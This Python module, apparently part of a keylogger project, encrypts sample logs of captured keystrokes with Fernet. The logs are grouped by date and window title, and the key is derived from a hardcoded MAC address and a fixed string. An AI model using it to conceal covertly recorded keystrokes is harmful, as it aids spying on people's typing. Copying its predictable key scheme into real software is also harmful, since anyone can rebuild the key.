import json
import base64
from cryptography.fernet import Fernet
from getmac import get_mac_address

#exsemple
exsemple_dic={"f8:54:f6:bc:2e:64": {"12/02/2025  16:04": {"Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"], "כרטיסייה חדשה - Google Chrome": ["h", "k", "h", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"], "Program Manager": ["shift", "Q"]}}}


#create a key base on the mac address
def create_key():
    # for test option
    ad="f8:54:f6:bc:2e:64"
    address=ad.replace(":","f")

    # address = get_mac_address().replace(":","f") #get mac address and replace ":" white "f"
    base_key = f"fp88{address}wAxDAAjijM=" #our key
    final_key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64
    return final_key


def encrypt_data(dic_data):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(json.dumps(dic_data).encode())
    return encrypted_data

# Example
key=create_key()
encrypted_dic=encrypt_data(exsemple_dic)

if __name__ == "__main__":
    print("🔑 key:",key)
    print("🔒 encrypted data:",encrypted_dic)

